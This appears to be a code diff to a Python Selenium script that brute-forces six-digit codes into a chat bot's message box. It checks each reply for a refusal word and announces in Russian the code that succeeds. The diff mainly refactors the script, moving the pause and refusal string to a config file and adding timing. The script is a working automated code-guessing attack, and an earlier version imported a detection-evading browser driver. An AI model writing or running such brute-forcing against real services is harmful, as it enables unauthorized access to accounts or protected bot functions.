@@ -1,11 +1,10 @@
 import time
 
-from selenium.webdriver.common.bidi.browsing_context import PrintResult
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
-import undetected_chromedriver as uc
 
-BAD = "Нет"
+from config import PAUSE, BAD
+from utils import calc_time
 
 def run_bruteforce(driver):
     try:
@@ -23,6 +22,7 @@ def run_bruteforce(driver):
         message_input.click()
         time.sleep(0.5)
 
+        start_time = time.perf_counter()
         for i in range(200):
             code = f"{i:06d}"
 
@@ -32,7 +32,7 @@ def run_bruteforce(driver):
             message_input.send_keys(code)
             message_input.send_keys(Keys.ENTER)
 
-            time.sleep(0.1)
+            time.sleep(PAUSE)
 
             if i % 10 == 0:
                 try:
@@ -42,20 +42,21 @@ def run_bruteforce(driver):
                     last_messages = [msg.text for msg in messages[-250:]]
 
                     stop_found = False
-                    print("sz =", len(last_messages))
+                    #print("sz =", len(last_messages))
                     for msg_text in last_messages:
                         if msg_text.lower() == '':
-                            print('skip')
+                            #print('skip')
                             continue
                         #print("!!!")
                         if not BAD.lower() in msg_text.lower():
+                            calc_time(start_time)
                             print("!", msg_text)
                             print(f"\n[★★★] УСПЕХ! Бот ответил: '{msg_text}'")
                             print(f"[★★★] Правильный код оказался: {code}")
                             stop_found = True
                             break
-                        else:
-                            print("! no ", msg_text)
+                        #else:
+                        #    print("! no ", msg_text)
 
                     if stop_found:
                         break
@@ -66,6 +67,7 @@ def run_bruteforce(driver):
                 print(f"[Прогресс] Отправлено: {code} ... ждем ответ")
 
         print("\n[+] Работа цикла завершена.")
+        calc_time(start_time)
 
     finally:
         print("[!] Оставляю браузер открытым на время для проверки...")
